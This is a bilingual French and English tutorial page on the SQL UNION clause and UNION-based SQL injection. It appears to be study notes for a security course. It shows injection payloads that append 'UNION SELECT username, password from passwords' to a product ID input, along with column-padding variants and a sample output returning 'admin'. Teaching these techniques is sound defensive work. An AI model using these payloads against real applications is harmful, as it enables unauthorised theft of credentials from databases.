# Union Clause

***

### <mark style="color:red;">Union</mark>

* La clause **UNION** combine les résultats de plusieurs `SELECT`.
* Avec une injection `UNION`, on peut **extraire des données** de plusieurs tables et bases.
* Exemple : explorer le contenu de la table `ports`.

```shell-session
mysql> SELECT * FROM ports;
```

Next, let us see the output of the `ships` tables:

```shell-session
mysql> SELECT * FROM ships;
```

Now, let us try to use `UNION` to combine both results:

```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;
```

* `UNION` combine les résultats de plusieurs `SELECT` en un seul.
* Les lignes des tables `ports` et `ships` apparaissent ensemble dans le résultat.
* **Important** : les colonnes sélectionnées doivent avoir le **même type de données** à chaque position.

***

### <mark style="color:red;">Even Columns</mark>

* Une instruction `UNION` ne fonctionne que si les `SELECT` ont **le même nombre de colonnes**.
* Si les colonnes diffèrent, une **erreur** est générée.

```shell-session
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

For example, if the query is:

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

{% code fullWidth="true" %}
```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
{% endcode %}

La requête retournera les **colonnes `username` et `password`** de la table `passwords`, à condition que la table `products` ait **deux colonnes**.

***

### <mark style="color:red;">Un-even Columns</mark>

* Si le nombre de colonnes du `SELECT` original diffère de celui que l’on veut injecter, il faut **remplir les colonnes manquantes avec des données factices**.
* Exemples de données factices :
  * **Chaîne** : `"junk"`
  * **Nombre** : `1` (pratique pour suivre les positions des colonnes)
  * **NULL** : convient à tous les types de données.
* Le type de la donnée factice doit correspondre au type attendu, sinon la requête échoue.

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. For example, if the original query used `SELECT` on a table with four columns, our `UNION` injection would be:

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

This query would return:

{% code fullWidth="true" %}
```shell-session
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```
{% endcode %}
